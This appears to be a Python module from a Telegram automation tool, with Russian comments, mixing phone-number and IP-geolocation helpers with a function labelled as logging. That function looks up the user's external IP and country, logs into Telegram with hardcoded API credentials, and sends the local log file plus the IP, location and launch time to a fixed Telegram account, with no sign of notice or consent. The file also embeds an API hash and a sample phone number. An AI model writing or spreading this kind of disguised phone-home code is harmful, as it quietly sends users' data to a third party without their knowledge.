import datetime
import json

import requests
from telethon import TelegramClient
from urllib.request import urlopen  # Изменено с urllib2 на urllib.request

from telethon.errors import FilePartsInvalidError

from system.auxiliary_functions.config import program_version, date_of_program_change
from loguru import logger

import phonenumbers
from phonenumbers import carrier, geocoder


def getting_phone_number_data_by_phone_number(phone_numbers):
    # phone_numbers = "+79381708846"

    # Пример номера телефона для анализа
    number = phonenumbers.parse(f"+{phone_numbers}", None)

    # Получение информации о стране и операторе на русском языке
    country_name = geocoder.description_for_number(number, "ru")
    operator_name = carrier.name_for_number(number, "ru")

    # Вывод информации
    logger.info(f"Номер: {phone_numbers}, Оператор: {operator_name}, Страна: {country_name}")


def get_country_flag(ip_address):
    """Определение страны по ip адресу на основе сервиса https://ipwhois.io/ru/documentation.
    Возвращает флаг и название страны.

    Аргументы:
    :param ip_address: ip адрес
    :return: флаг и название страны
    """
    try:
        response = urlopen(f'http://ipwho.is/{ip_address}')
        ipwhois = json.load(response)

        emoji = ipwhois['flag']['emoji']
        country = ipwhois['country']
        return emoji, country
    except KeyError:
        response = urlopen(f'http://ipwho.is/{ip_address}')
        ipwhois = json.load(response)

        emoji = "🏳️" # флаг неизвестной страны, если флаг не указан или не определен
        country = ipwhois['country']
        return emoji, country


def get_external_ip():
    """Получение внешнего ip адреса"""
    try:
        response = requests.get('https://httpbin.org/ip')
        response.raise_for_status()
        external_ip = response.json().get("origin")
        return external_ip
    except requests.RequestException as error:
        return None


async def loging():
    """
    Логирование TelegramMaster 2.0
    """

    local_ip = get_external_ip()
    emoji, country = get_country_flag(local_ip)

    client = TelegramClient('system/logging_in/log', api_id=7655060, api_hash="cc1290cd733c1f1d407598e5a31be4a8")
    await client.connect()
    date = datetime.datetime.now()  # фиксируем и выводим время старта работы кода

    # Красивое сообщение
    message = (
        f"🚀 **Launch Information**\n\n"
        f"🌍 IP Address: `{local_ip}`\n"
        f"📍 Location: {country} {emoji}\n"
        f"🕒 Date: `{date.strftime('%Y-%m-%d %H:%M:%S')}`\n"
        f"🔧 Program Version: `{program_version}`\n"
        f"📅 Date of Change: `{date_of_program_change}`"
    )

    try:
        await client.send_file(535185511, 'user_settings/log/log.log', caption=message)
        client.disconnect()
    except FilePartsInvalidError as error:
        logger.error(error)
        client.disconnect()


if __name__ == "__main__":
    loging()
